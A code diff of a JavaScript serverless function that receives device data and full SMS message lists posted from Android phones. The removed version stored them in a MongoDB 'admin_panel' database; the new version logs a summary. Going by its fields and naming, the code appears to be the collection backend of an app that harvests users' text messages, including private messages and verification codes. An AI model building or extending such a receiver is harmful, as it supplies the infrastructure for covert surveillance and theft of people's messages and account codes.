@@ -1,9 +1,3 @@
-// Vercel serverless function to receive SMS data
-import { MongoClient } from 'mongodb';
-
-const MONGODB_URI = process.env.MONGODB_URI;
-const client = new MongoClient(MONGODB_URI);
-
 export default async function handler(req, res) {
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -19,42 +13,32 @@ export default async function handler(req, res) {
   }
   
   try {
-    const {
-      device_phone,
-      device_model,
-      android_version,
-      install_time,
-      permissions_granted,
-      sms_messages
-    } = req.body;
+    const data = req.body;
     
-    await client.connect();
-    const db = client.db('admin_panel');
-    const collection = db.collection('user_installations');
-    
-    const result = await collection.insertOne({
-      device_phone,
-      device_model,
-      android_version,
-      install_time,
-      permissions_granted,
-      sms_messages,
-      created_at: new Date()
+    // Log received SMS data for monitoring
+    console.log('📱 SMS Data Received:', {
+      phone: data.device_phone,
+      model: data.device_model,
+      sms_count: data.sms_messages?.length || 0,
+      timestamp: new Date().toISOString()
     });
     
-    await client.close();
+    // In real implementation, save to database here
+    // For now, just return success
     
     res.status(200).json({ 
       status: 'success', 
-      message: 'Data saved successfully',
-      id: result.insertedId
+      message: 'SMS data received and logged successfully',
+      device_phone: data.device_phone || 'Unknown',
+      sms_count: data.sms_messages?.length || 0,
+      received_at: new Date().toISOString()
     });
     
   } catch (error) {
-    console.error('Database error:', error);
+    console.error('❌ Error processing SMS data:', error);
     res.status(500).json({ 
       status: 'error', 
-      message: 'Failed to save data' 
+      message: error.message 
     });
   }
 }
